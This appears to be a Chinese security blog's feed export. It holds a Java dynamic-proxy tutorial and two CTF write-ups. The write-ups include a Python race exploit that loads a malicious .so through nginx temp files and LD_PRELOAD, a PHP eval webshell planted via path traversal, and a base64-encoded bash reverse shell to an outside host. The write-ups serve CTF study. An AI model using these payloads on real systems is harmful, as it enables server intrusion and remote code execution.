class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(String.format(<span class="string">&quot;log end time [%s]&quot;</span>,<span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后用<strong>java.lang.reflect.Proxy</strong>的newProxyInstance方法来构造一个指定接口的代理类的额一个新实例，<u>所有方法会调用给定处理器（也就是LogHandler）的invoke方法</u></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jdkDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.jtDemo.UserService;</span><br><span class="line"><span class="keyword">import</span> com.jtDemo.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建被代理的对象</span></span><br><span class="line">        <span class="type">UserServiceImpl</span> <span class="variable">userServiceimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserServiceImpl</span>();</span><br><span class="line">        <span class="comment">//2.获取对应的ClassLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> userServiceimpl.getClass().getClassLoader();</span><br><span class="line">        <span class="comment">//3.获取所有接口的Class，这里只实现了一个UserService接口</span></span><br><span class="line">        Class&lt;?&gt;[] interfaces = userServiceimpl.getClass().getInterfaces();</span><br><span class="line">        <span class="comment">//4.创建一个将传给代理类的调用请求处理器，处理所有的代理对象上的方法调用</span></span><br><span class="line">        <span class="comment">//这里创建的是一个自定义的日志处理器，须传入实际的执行对象 userServiceImpl</span></span><br><span class="line">        <span class="type">LogHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LogHandler</span>(userServiceimpl);</span><br><span class="line">        <span class="comment">//5.根据上面的信息创建代理对象</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">               在这个过程中，</span></span><br><span class="line"><span class="comment">               a.JDK会通过根据传入的参数信息动态地在内存中创建和.class 文件等同的字节码</span></span><br><span class="line"><span class="comment">               b.然后根据相应的字节码转换成对应的class，</span></span><br><span class="line"><span class="comment">               c.然后调用newInstance()创建代理实例</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">proxy</span> <span class="operator">=</span> (UserService) Proxy.newProxyInstance(classLoader, interfaces, handler);</span><br><span class="line">        proxy.select();</span><br><span class="line">        proxy.update();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>项目输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">log start time [Sat Mar <span class="number">12</span> 09:<span class="number">02</span>:<span class="number">44</span> CST <span class="number">2022</span>]</span><br><span class="line">查询方法</span><br><span class="line">log end time [Sat Mar <span class="number">12</span> 09:<span class="number">02</span>:<span class="number">44</span> CST <span class="number">2022</span>]</span><br><span class="line">log start time [Sat Mar <span class="number">12</span> 09:<span class="number">02</span>:<span class="number">44</span> CST <span class="number">2022</span>]</span><br><span class="line">更新方法</span><br><span class="line">log end time [Sat Mar <span class="number">12</span> 09:<span class="number">02</span>:<span class="number">44</span> CST <span class="number">2022</span>]</span><br></pre></td></tr></table></figure>

<p>可以发现传给代理的方法都被转发到了处理器<code>LogHandler handler = new LogHandler(userServiceimpl);</code>中的invoke方法中</p>
<p>我们可以通过工具分析出构造出来的动态代理类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"><span class="keyword">import</span> proxy.UserService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">UserServiceProxy</span> <span class="keyword">extends</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m4;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserServiceProxy</span><span class="params">(InvocationHandler var1)</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object var1)</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="comment">// 省略...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="comment">// 省略...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">select</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m4, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="comment">// 省略...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, m3, (Object[])<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            m1 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;equals&quot;</span>, Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>));</span><br><span class="line">            m2 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;toString&quot;</span>);</span><br><span class="line">            m4 = Class.forName(<span class="string">&quot;proxy.UserService&quot;</span>).getMethod(<span class="string">&quot;select&quot;</span>);</span><br><span class="line">            m0 = Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getMethod(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            m3 = Class.forName(<span class="string">&quot;proxy.UserService&quot;</span>).getMethod(<span class="string">&quot;update&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodError</span>(var2.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(var3.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到动态代理类在执行方法的时候都是用handler中我们重写的invoke方法来调用的</p>
<ul>
<li>UserServiceProxy 继承了 Proxy 类，并且实现了被代理的所有接口，以及equals、hashCode、toString等方法</li>
<li>由于 UserServiceProxy 继承了 Proxy 类，所以每个代理类都会关联一个 InvocationHandler 方法调用处理器</li>
<li>类和所有方法都被 <code>public final</code> 修饰，所以代理类只可被使用，不可以再被继承</li>
<li>每个方法都有一个 Method 对象来描述，Method 对象在static静态代码块中创建，以 <code>m + 数字</code> 的格式命名</li>
<li>调用方法的时候通过 <code>super.h.invoke(this, m1, (Object[])null);</code> 调用，其中的 <code>super.h.invoke</code> 实际上是在创建代理的时候传递给 <code>Proxy.newProxyInstance</code> 的 LogHandler 对象，它继承 InvocationHandler 类，负责实际的调用处理逻辑</li>
</ul>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220312090431-jubo9rh.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx缓存带来的临时文件</title>
    <url>/2022/05/16/nginx%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="关于文件上传"><a href="#关于文件上传" class="headerlink" title="关于文件上传"></a>关于文件上传</h1><blockquote>
<p>来自于ctfshow技术分享</p>
</blockquote>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515225958-75i1tsg.png" alt="image.png"></p>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="PHP临时文件机制"><a href="#PHP临时文件机制" class="headerlink" title="PHP临时文件机制"></a>PHP临时文件机制</h2><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。</p>
<p>$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件的原名称。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如<span class="string">&quot;image/gif&quot;</span>。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 已上传文件的大小，单位为字节。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 该文件上传的错误代码，上传成功其值为<span class="number">0</span>，否则为错误信息。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端存储的临时文件名</span><br></pre></td></tr></table></figure>

<p>在临时文件包含漏洞中<code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p>
<h3 id="储存目录"><a href="#储存目录" class="headerlink" title="储存目录"></a>储存目录</h3><p>临时目录由php.ini的<code>upload_tmp_dir</code>属性指定。假如<code>upload_tmp_dir</code>的路径不可写，PHP会上传到系统默认的临时目录中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Linux:</span><br><span class="line">/tmp/</span><br><span class="line"></span><br><span class="line">Win:</span><br><span class="line">C:/Windows/</span><br><span class="line">C:/Windows/Temp/</span><br></pre></td></tr></table></figure>

<h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p>
<p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p>
<h1 id="nginx缓存"><a href="#nginx缓存" class="headerlink" title="nginx缓存"></a>nginx缓存</h1><h2 id="body-buffer"><a href="#body-buffer" class="headerlink" title="body_buffer"></a>body_buffer</h2><p>官方文档：<a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size">http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size</a></p>
<p><code>client_body_buffer_size</code>这个参数，也就是nginx关于上传的配置处</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516190135-d1k6fp6.png" alt="image.png"></p>
<p>设置读取客户端请求正文的缓冲区大小。 如果请求正文大于缓冲区，则将整个正文或仅其部分写入临时文件。 默认情况下，缓冲区大小等于两个内存页。 这是 x86、其他 32 位平台和 x86-64 上的 8K。 在其他 64 位平台上通常为 16K。</p>
<p>也就是说当body中数据的大于16k的时候就会有临时文件写入。</p>
<p><code>client_body_in_file_only</code>，默认是关闭</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516190740-9c11zzu.png" alt="image.png"></p>
<p>确定 nginx 是否应将<em>整个客户端请求正文</em>保存到文件中。 该指令可以在调试期间使用，或者在使用 $request_body_file 变量或模块 ngx_http_perl_module 的 $r-&gt;request_body_file 方法时使用。</p>
<p>当设置为 on 时，临时文件在请求处理后不会被删除。</p>
<p>值 clean 将导致请求处理后留下的临时文件被删除。</p>
<p><code>client_body_temp_path</code>，关于临时文件的存放目录</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516190938-aotwaea.png" alt="image.png"></p>
<p>定义一个目录，用于存储保存客户端请求正文的临时文件。 指定目录下最多可以使用三级子目录层次结构。 例如，在以下配置中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">client_body_temp_path /spool/nginx/client_temp <span class="number">1</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>临时文件的目录就会像下面这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/spool/nginx/client_temp/<span class="number">7</span>/<span class="number">45</span>/<span class="number">00000123457</span></span><br></pre></td></tr></table></figure>

<p>因此当我们的请求body大于16k的时候，他就会生成缓存到上面这个目录，但是马上又删除了，但是他删除以后，又继续进行了修改和访问</p>
<p>就可以通过&#x2F;proc&#x2F;PID&#x2F;fd&#x2F;{}来访问到这个临时文件</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>如果我们的so文件临时膨胀到16k以上，也就是在so文件之后加入垃圾字节，就能够让so文件被存入到临时文件中去。</p>
<h3 id="例：ctfshow-web818"><a href="#例：ctfshow-web818" class="headerlink" title="例：ctfshow web818"></a>例：ctfshow web818</h3><p>直接学习羽师傅脚本即可，他这里是用socket库来进行网络请求的。</p>
<p>关键点是31行的恶意字节填充，让hack.so的文件内容写入nginx产生的临时文件</p>
<p>接着用bruter函数对proc目录进行一个爆破即可，这里的pid题目中会给到，所以只用爆破后面的fd即可</p>
<p>羽师傅的脚本真的清晰，学习了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">port= <span class="number">28118</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line">l=<span class="built_in">str</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>)).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s=socket.socket()</span><br><span class="line">		s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">		x=<span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Content-Length: &#x27;&#x27;&#x27;</span>+l+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">		s.send(x)</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruter</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line">			<span class="built_in">print</span>(fd)</span><br><span class="line">			s=socket.socket()</span><br><span class="line">			s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">			s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">			<span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">			s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="fastcgi-buffer"><a href="#fastcgi-buffer" class="headerlink" title="fastcgi_buffer"></a>fastcgi_buffer</h2><p><a href="http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_buffering">http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_buffering</a></p>
<p><code>fastcgi_buffers</code></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516205014-a325727.png" alt="image.png"></p>
<p>当启用来自 FastCGI 服务器的响应缓冲时，限制在响应尚未完全读取时可能正忙于向客户端发送响应的缓冲区的总大小。 同时，其余缓冲区可用于读取响应，并在需要时将部分响应缓冲到临时文件。 默认情况下，大小受 fastcgi_buffer_size 和 fastcgi_buffers 指令设置的两个缓冲区的大小限制。</p>
<p><code>fastcgi_temp_path</code></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516205217-kaxreg3.png" alt="image.png"></p>
<p>a temporary file might look like this:</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/spool/nginx/fastcgi_temp/7/45/00000123457</span><br></pre></td></tr></table></figure>

</blockquote>
<p>同样对于fastcgi缓存的利用也和上面的body_buffer利用思路一样，只是临时文件保存的目录变了</p>
]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnhub2022春季赛</title>
    <url>/2022/04/27/pwnhub2022%E6%98%A5%E5%AD%A3%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="pwnhub春季赛web"><a href="#pwnhub春季赛web" class="headerlink" title="pwnhub春季赛web"></a>pwnhub春季赛web</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>周末一堆事情，而且周日正常上课，搞得没有好好打。所以认真复现一下。</p>
<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><blockquote>
<ol>
<li>mysql恶意服务端读取文件</li>
<li>路径拼接导致的文件包含</li>
</ol>
</blockquote>
<p>mysql恶意服务端读取任意文件</p>
<p>然后路径大概是这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/www/html/route/route.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/baseTool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/mysqlTool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/base64Tool.php</span><br><span class="line">/<span class="keyword">var</span>/www/html/tools/userTools/testTool.php</span><br></pre></td></tr></table></figure>


<p>读取到testTool的时候就发现了hint</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">testTool</span> <span class="keyword">extends</span> <span class="title">baseTool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>] = <span class="variable">$arg</span>[<span class="string">&#x27;Y0U_CA0_n3vEr_F1nD_m3_LOL&#x27;</span>] <span class="keyword">or</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">userToolInit</span>(<span class="keyword">__CLASS__</span>, <span class="string">&#x27;./index.php?s=tool/test&#x27;</span>, <span class="string">&#x27;testxe7xb1xbb&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;/tmp/sandbox&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>]);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output = <span class="variable">$value</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>];</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&#x27;/tmp/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$value</span>[<span class="string">&#x27;file&#x27;</span>]), <span class="variable">$value</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>他有一个反序列化字符串的地方，没有过滤或者限制</p>
<p>因此直接就能phpinfo</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427231142-x05ny6k.png" alt="image.png"></p>
<p>但是并没有什么用，不过我们可以知道remote_addr的值为218.94.97.29</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427223626-o2z27cp.png" alt="image.png"></p>
<p>接下来尝试用下面的方法写shell进去，没有任何过滤</p>
<p>但是写入的shell会在<code>/tmp/sandbox/027abbac7d8dc5486b5f33965cfce8c4/</code>目录下，没办法直接访问</p>
<p>因为<code>$this-&gt;class</code>可控而且拼接，所以可以直接目录穿越包含刚刚写入的shell</p>
<p>但是这里要注意他有个后缀<code>Tool.php</code>，因此写入的时候让文件名也是<code>xxxTool.php</code>即可</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427232239-1j95apf.png" alt="image.png"></p>
<p>写入：</p>
<p>post</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Y0U_CA0_n3vEr_F1nD_m3_LOL[file]=asoulTool.php&amp;Y0U_CA0_n3vEr_F1nD_m3_LOL[data]=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>包含：</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427232053-xffndtq.png" alt="image.png"></p>
<h1 id="EzPDFParser"><a href="#EzPDFParser" class="headerlink" title="EzPDFParser"></a>EzPDFParser</h1><blockquote>
<p><a href="https://votiro.com/blog/preventing-log4j-cve-2021-44228-exploits-using-pdf-as-a-delivery-channel/">https://votiro.com/blog/preventing-log4j-cve-2021-44228-exploits-using-pdf-as-a-delivery-channel/</a></p>
<p>漏洞复现类赛题</p>
</blockquote>
<p>通过题目war包可以看到log4j的依赖</p>
<p>反弹shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4xNDQuNDEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p>vps开启监听</p>
